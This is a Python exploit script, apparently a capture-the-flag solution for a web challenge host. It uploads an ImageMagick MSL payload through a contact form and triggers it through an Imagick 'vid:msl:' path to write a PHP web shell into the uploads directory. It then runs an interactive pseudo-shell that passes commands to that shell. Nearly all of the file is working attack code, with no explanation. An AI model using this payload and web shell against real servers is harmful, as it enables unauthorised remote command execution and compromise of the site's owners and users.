import requests
from os import urandom
from binascii import b2a_hex
from hashlib import md5
from subprocess import check_output
from readline import redisplay

URL = "https://akasha.hackthesystem.pro/"


def execute_msl(hash, time_stamp, url=URL):
    time = time_stamp
    print(f"[+] folder name: {hash}{time}")
    res = requests.get(
        f"{url}/index.php?module=Imagick&action=vid:msl:/tmp/{hash}{time}/*.txt")
    if "Terjadi Kesalahan" in res.text:
        return False
    return True


def get_timestamp(date: str):
    time = date.split()[-2].split(':')
    day = 21
    month = 12
    year = 2022
    hour = time[0]
    minute = time[1]
    second = time[2]
    time_stamp = check_output(
        f'php -r "echo mktime({hour}, {minute}, {second}, {month}, {day}, {year});"', shell=True)
    return time_stamp


def upload_msl(message, url=URL):
    rand_name = b2a_hex(urandom(10))
    print("[+] rand name: "+rand_name.decode())
    res = requests.post(f"{url}/index.php?module=Contact&action=send", data={
        "name": rand_name.decode(),
        "body": message,
    })
    print("[+] server: "+res.text)
    time_stamp = get_timestamp(res.headers['Date']).decode()
    hash = b2a_hex(md5(rand_name).digest()).decode()
    print("[+] time stamp: "+time_stamp)
    return (hash, time_stamp)

def pseudo_shell(filename, url=URL):
    while (True):
        cmd = input("$ ")
        redisplay()
        res = requests.get(f"{url}uploads/{filename}", params={"a":cmd})
        print(res.text)

if __name__ == "__main__":
    filename = "s.php"
    b = upload_msl(f"""
<?xml version="1.0" encoding="UTF-8"?>
<image>
 <read filename="caption:&lt;?php @system(@$_REQUEST['a']); ?&gt;" />
 <write filename="info:/var/www/html/public/uploads/{filename}" />
</image>
    """.strip())
    a = execute_msl(*b)
    if not a:
        print("[x] exploit failure!")
    print("[+] upload shell success!")
    pseudo_shell(filename)
    
